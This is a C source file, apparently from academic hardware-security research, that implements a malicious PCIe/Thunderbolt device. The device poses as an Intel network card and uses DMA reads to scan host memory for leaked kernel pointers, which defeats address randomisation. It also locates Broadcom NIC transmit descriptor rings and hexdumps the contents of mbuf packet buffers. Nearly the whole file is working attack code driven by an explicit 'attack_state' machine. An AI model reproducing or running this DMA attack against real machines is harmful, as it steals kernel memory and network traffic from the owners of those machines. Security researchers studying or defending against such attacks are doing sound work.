/*-
 * SPDX-License-Identifier: BSD-2-Clause
 * 
 * Copyright (c) 2015-2018 Colin Rothwell
 * 
 * This software was developed by SRI International and the University of
 * Cambridge Computer Laboratory under DARPA/AFRL contract FA8750-10-C-0237
 * ("CTSRD"), as part of the DARPA CRASH research programme.
 * 
 * We acknowledge the support of EPSRC.
 * 
 * We acknowledge the support of Arm Ltd.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <stdint.h>
#include <stdio.h>

#include "mask.h"
#include "macos-stub-mbuf.h"
#include "pcie.h"
#include "pcie-backend.h"
#include "qemu/bswap.h"

static inline uint16_t
uint16_min(uint16_t left, uint16_t right)
{
	return (left < right) ? left : right;
}

/*
 * We want to snoop data out of anything interesting. A good candidate is the
 * transmit mbufs -- in particular we hope that we'll be able to some adjacent
 * local socket mbufs.
 *
 * We scan through pages, checking to see if the first 16 * 16 = 256 bytes all
 * match Brett's heuristic for a send buffer descriptor.
 */

/* Each send buffer descriptor is 128 bits = 16 bytes */
struct bcm5701_send_buffer_descriptor {
	uint64_t host_address;
	uint16_t flags;
	uint16_t length;
	uint16_t vlan_tag;
	uint16_t reserved;
};

enum bcm5701_send_flags {
	BSF_TCP_UDP_CKSUM = (1 << 0),
	BSF_IP_CKSUM = (1 << 1),
	BSF_PACKET_END = (1 << 2),
	// 3, 4, 5 are reserved
	BSF_VLAN_TAG = (1 << 6),
	BSF_COAL_NOW = (1 << 7),
	BSF_CPU_PRE_DMA = (1 << 8),
	BSF_CPU_POST_DMA = (1 << 9),
	// 10, 11, 12, 13, 14, are reserved
	BSD_DONT_GEN_CRC = (1 << 15)
};

void
print_descriptors(struct bcm5701_send_buffer_descriptor *descriptor,
	uint64_t count)
{
	for (uint64_t i = 0; i < count; ++i) {
		printf("host_address: 0x%016lx; flags: 0x%04x; length: 0x%04x;\n\t"
			"vlan_tag: 0x%04x; reserved: 0x%04x.\n",
			descriptor[i].host_address, descriptor[i].flags,
			descriptor[i].length, descriptor[i].vlan_tag,
			descriptor[i].reserved);
	}
}

bool
any_descriptor_nonzero(struct bcm5701_send_buffer_descriptor *descriptor,
	uint64_t count)
{
	for (uint64_t i = 0; i < count; ++i) {
		if (descriptor[i].host_address || descriptor[i].flags ||
			descriptor[i].length || descriptor[i].vlan_tag ||
			descriptor[i].reserved) {
			return true;
		}
	}
	return false;
}

bool
is_probably_descriptor(const struct bcm5701_send_buffer_descriptor *buffer)
{
	return ((buffer->flags &
		(uint32_mask_enable_bits(5, 3) | uint32_mask_enable_bits(14, 10)))
		== 0) && buffer->length != 0 && (buffer->reserved == 0) &&
		(buffer->host_address != 0);
}

bool
is_brett_descriptor(const struct bcm5701_send_buffer_descriptor *buffer)
{
	return ((buffer->host_address & 0xffffffff) == 0) &&
		((buffer->host_address & 0xff00000000000000) == 0x0800000000000000) &&
		(buffer->vlan_tag == 0);
}

void
endianess_swap_descriptor(struct bcm5701_send_buffer_descriptor *descriptor)
{
	uint64_t old_ha = bswap64(descriptor->host_address);
	descriptor->host_address = (old_ha >> 32) | (old_ha << 32);
	descriptor->flags = bswap16(descriptor->flags);
	descriptor->length = bswap16(descriptor->length);
	descriptor->vlan_tag = bswap16(descriptor->vlan_tag);
	descriptor->reserved = bswap16(descriptor->reserved);
}

void
endianess_swap_descriptors(struct bcm5701_send_buffer_descriptor *descriptor,
	uint64_t count)
{
	for (uint64_t i = 0; i < count; ++i) {
		endianess_swap_descriptor(&(descriptor[i]));
	}
}

static inline uint64_t
get_page_address(uint64_t address)
{
	return (address & ~uint64_mask(12));
}

int
read_page(uint64_t address, uint32_t devfn, uint8_t* buffer)
{
	const int CHUNK_SIZE = 256;
	int i, read_result = 0;
	uint64_t page_address = get_page_address(address);
	for (i = 0; i < 4096; i += CHUNK_SIZE) {
		read_result = perform_dma_read((buffer + i), CHUNK_SIZE, devfn, 0,
			(page_address + i));
		if (read_result != 0) {
			break;
		}
	}
	return read_result;
}

void
hexdump(uint8_t* data, uint64_t length)
{
	const uint64_t BYTES_PER_LINE = 16;
	uint64_t char_offset, offset = 0;
	while (offset < length) {
		if (offset % BYTES_PER_LINE == 0) {
			printf("%04lx  ", offset);
		}
		printf("%02x", data[offset]);
		++offset;
		if ((offset % BYTES_PER_LINE == 0) || offset >= length) {
			putchar(' ');
			for (char_offset = offset - BYTES_PER_LINE; char_offset < offset;
				++char_offset) {
				if (data[char_offset] >= 0x20 && data[char_offset] <= 126) {
					putchar(data[char_offset]);
				} else {
					putchar(' ');
				}
			}
			putchar('\n');
		} else {
			putchar(' ');
		}
	}
}

int
print_page_at_address(uint64_t address, uint32_t devfn)
{
	int read_result;
	uint8_t page_data[4096];

	read_result = read_page(address, devfn, page_data);

	if (read_result == -1) {
		printf("UR trying read page.\n");
		return read_result;
	}

	printf("0x%lx\n", get_page_address(address));
	hexdump(page_data, 4096);

	return read_result;
}

enum attack_state {
	AS_UNINITIALISED,
	AS_PROBING_NIC,
	/* The above doesn't work from Thunderbolt. The brdge itself seems to drop the
	 * config requests. XXX: Would be interesting to try on FreeBSD
	 * internally.
	 */
	AS_LOOKING_FOR_LEAKED_SYMBOL,
	AS_LOOKING_FOR_DESCRIPTOR_RING,
	AS_FINDING_MBUF,
	AS_READING_MBUF_PAGE
};

enum packet_response {
	PR_NO_RESPONSE, PR_RESPONSE
};

struct packet_response_state {
	uint32_t devfn;
	enum attack_state attack_state;
};

enum packet_response
respond_to_packet(struct packet_response_state *state,
	struct RawTLP *in, struct RawTLP *out)
{
	uint16_t requester_id;
	uint64_t req_addr;
	enum packet_response response = PR_NO_RESPONSE;
	struct TLP64DWord0 *dword0 = (struct TLP64DWord0 *)in->header;
	struct TLP64RequestDWord1 *request_dword1 =
		(struct TLP64RequestDWord1 *)(in->header + 1);
	struct TLP64ConfigRequestDWord2 *config_request_dword2 =
		(struct TLP64ConfigRequestDWord2 *)(in->header + 2);

	enum tlp_direction dir = get_tlp_direction(in);

	requester_id = request_dword1->requester_id;

	switch (dword0->type) {
	case CFG_0:
		if ((config_request_dword2->device_id & uint32_mask(3)) != 0) {
			printf("Don't like device_id: %x.\n",
				config_request_dword2->device_id);
			break;
		}

		state->devfn = config_request_dword2->device_id;
		response = PR_RESPONSE;
		req_addr = get_config_req_addr(in);

		if (dir == TLPD_READ) {
			out->data_length = 4;
			switch (req_addr) {
			case 0: /* vendor and device id */
				out->data[0] = 0x104b8086;
				if (state->attack_state == AS_UNINITIALISED) {
					state->attack_state = AS_LOOKING_FOR_DESCRIPTOR_RING;
				}
				break;
			default:
				out->data[0] = 0;
			}
			out->data[0] = bswap32(out->data[0]);
		} else {
			out->data_length = 0;
		}

		out->header_length = 12;
		create_completion_header(out, dir, state->devfn,
			TLPCS_SUCCESSFUL_COMPLETION, 4, requester_id, request_dword1->tag,
			0);

		break;
	case CPL:
		printf("Got CPL ");
		if (in->data_length > 0) {
			printf("with data[0] 0x%x.\n", in->data[0]);
		} else {
			printf("without data.\n");
		}
		break;
	default:
		printf("Ignoring %s (0x%x) TLP.\n", tlp_type_str(dword0->type),
			dword0->type);
		break;
	}
	return response;
}

int
main(int argc, char *argv[])
{
	int i, send_result, read_result;
	TLPQuadWord tlp_in_quadword[32];
	TLPQuadWord tlp_out_header[2];
	TLPQuadWord tlp_out_data[16];
	struct RawTLP raw_tlp_in;
	struct RawTLP raw_tlp_out;
	raw_tlp_out.header = (TLPDoubleWord *)tlp_out_header;
	raw_tlp_out.data = (TLPDoubleWord *)tlp_out_data;

	enum packet_response response;
	struct packet_response_state packet_response_state;
	packet_response_state.attack_state = AS_UNINITIALISED;
	uint64_t read_addr, next_read_addr = 0x400000;
	/*
	 * We have found that in practise the tx ring is not located lower
	 * than this.
	 */
	struct bcm5701_send_buffer_descriptor *descriptor;
	struct bcm5701_send_buffer_descriptor descriptors[16];
	uint64_t candidate_symbols[32];
	uint8_t read_buffer[512];
	struct mbuf mbuf;

	uint16_t length;
	uint64_t descriptor_index, host_address, mbuf_page_address, mbuf_index;
	uint64_t mbuf_address, mbuf_data_address;
	uint8_t *mbuf_data;

	int init = pcie_hardware_init(argc, argv, &physmem);
	if (init) {
		puts("Problem initialising PCIE core.");
		return init;
	}

	uint64_t addr, req_addr;

	drain_pcie_core();
	puts("PCIe Core Drained. Let's go.");


	/* The rule of thumb I wanted whilst writing this was that the card only
	 * makes one DMA request/response before checking if the card has data for
	 * it.
	 *
	 * However, a lot of what I want to do is iterating through various
	 * collections of data items. This means that this is a while loop
	 * consisting of a number of what are essentially unrolled for loops.
	 */

	while (1) {
		wait_for_tlp(tlp_in_quadword, sizeof(tlp_in_quadword), &raw_tlp_in);

		if (is_raw_tlp_valid(&raw_tlp_in)) {
			response = respond_to_packet(&packet_response_state,
				&raw_tlp_in, &raw_tlp_out);
			if (response != PR_NO_RESPONSE) {
				send_result = send_tlp(&raw_tlp_out);
				assert(send_result != -1);
			}
			continue;
		}

		switch (packet_response_state.attack_state) {
		case AS_UNINITIALISED:
			break;
		case AS_PROBING_NIC:
			/* This doesn't work from Thunderbolt: we get UR responses coming
			 * from the bridges' ID.
			 */
			create_config_request_header(&raw_tlp_out, TLPD_READ,
				packet_response_state.devfn, 0, 0xF, bdf_to_uint(4, 0, 0), 0);
			send_result = send_tlp(&raw_tlp_out);
			printf("NIC probe result: %d.\n", send_result);
			break;
		case AS_LOOKING_FOR_LEAKED_SYMBOL:
			if ((next_read_addr & 0xFFFFF) == 0) {
				putchar('.');
				fflush(NULL);
			}
			read_result = perform_dma_read((uint8_t *)candidate_symbols,
				256, packet_response_state.devfn, 0, next_read_addr);
			read_addr = next_read_addr;
			if (read_result == -1) {
				next_read_addr += 4096;
				continue;
			} else {
				next_read_addr += 256;
			}

			for (i = 0; i < 32; ++i) {
				candidate_symbols[i] = bswap64(candidate_symbols[i]);
				/*if ((candidate_symbols[i] & 0xfffff) == 0x283c0) {*/
					/*printf("\nFound slid gIOBMDAllocator.\n");*/
					/*printf("At address 0x%lx.\n", read_addr);*/
					/*printf("Slid address: 0x%lx.\n", candidate_symbols[i]);*/
					/*printf("Slide: 0x%lx.\n", candidate_symbols[i] -*/
						/*0xffffff8000b283c0l);*/
				/*}*/
				if ((candidate_symbols[i] & 0xFFFFFFFFFF000000) ==
					0xFFFFFF8000000000) {
					printf("\nFound symbol.\n");
					printf("At address 0x%lx.\n", read_addr +
						i * sizeof(uint64_t));
					printf("Address: 0x%lx.\n", candidate_symbols[i]);
				}
			}
			break;
		case AS_LOOKING_FOR_DESCRIPTOR_RING:
			read_result = perform_dma_read((uint8_t *)descriptors,
				256, packet_response_state.devfn, 0, next_read_addr);
			read_addr = next_read_addr;
			next_read_addr += 4096;
			if (read_result == -1 || !any_descriptor_nonzero(descriptors, 16)) {
				continue;
			}
			endianess_swap_descriptors(descriptors, 16);
			if (!is_probably_descriptor(&(descriptors[0]))) {
			/*if (!is_brett_descriptor(&(descriptors[0]))) {*/
				continue;
			}
			printf("Probably a descriptor at 0x%lx OK.\n", read_addr);
			print_descriptors(descriptors, 1);
			packet_response_state.attack_state = AS_FINDING_MBUF;
			descriptor_index = 0;

			break;
		case AS_FINDING_MBUF:
			descriptor = &(descriptors[descriptor_index]);
			if (is_probably_descriptor(descriptor)) {
				host_address = descriptor->host_address;
				if ((host_address & uint64_mask(11)) == 0) {
					/* clusters are 2k aligned. */
					length = uint16_min(descriptor->length, 512);
					printf("Reading address 0x%lx.\n", host_address);
					read_result = perform_dma_read(read_buffer, length,
						packet_response_state.devfn, 0, host_address);
					if (read_result == -1) {
						printf("Read failed. :(\n");
					} else {
						hexdump(read_buffer, length);
					}
				} else { /* It's an mbuf, so we can look at the whole page. */
					mbuf_index = 0;
					mbuf_page_address = host_address & ~uint64_mask(12);
					packet_response_state.attack_state = AS_READING_MBUF_PAGE;
				}
			}
			descriptor_index++;
			if (descriptor_index >= 16 &&
				packet_response_state.attack_state != AS_READING_MBUF_PAGE) {
				printf("LOOKING FOR DESCRIPTOR RING AGAIN!.\n");
				packet_response_state.attack_state =
					AS_LOOKING_FOR_DESCRIPTOR_RING;
			}
			break;
		case AS_READING_MBUF_PAGE:
			mbuf_address = mbuf_page_address + (mbuf_index * 256);
			read_result = perform_dma_read((uint8_t *)(&mbuf), 256,
				packet_response_state.devfn, 0, mbuf_address);
			if (read_result == -1) {
				printf("Failed to read mbuf at 0x%lx.\n", mbuf_address);
			} else {
				mbuf.m_flags = bswap16(mbuf.m_flags);
				if (!(mbuf.m_flags & M_EXT)) {
					/* We don't have the address for external data. Hopefully
					 * we found it elsewhere.
					 */
					mbuf.m_data = bswap64(mbuf.m_data);
					mbuf.m_len = bswap32(mbuf.m_len);
					if (mbuf.m_len > 0 && mbuf.m_len < 224) { /* Probably not an mbuf. */
						mbuf_data = (uint8_t *)(
							((uint64_t)(&mbuf) & ~uint64_mask(12))
							| ((uint64_t)mbuf.m_data & uint64_mask(12))
							);
						printf("mbuf.m_data: 0x%lx. len: %d. ",
							mbuf.m_data, mbuf.m_len);
						printf("Data from mbuf at 0x%lx.\n", mbuf_address);
						hexdump(mbuf_data, mbuf.m_len);
					}
				}
			}
			++mbuf_index;
			if (mbuf_index >= (4096 / 256)) {
				packet_response_state.attack_state = (descriptor_index >= 16) ?
					AS_LOOKING_FOR_DESCRIPTOR_RING : AS_FINDING_MBUF;
			}
			break;
		}
	}
	
	puts("Quitting main loop.");
}
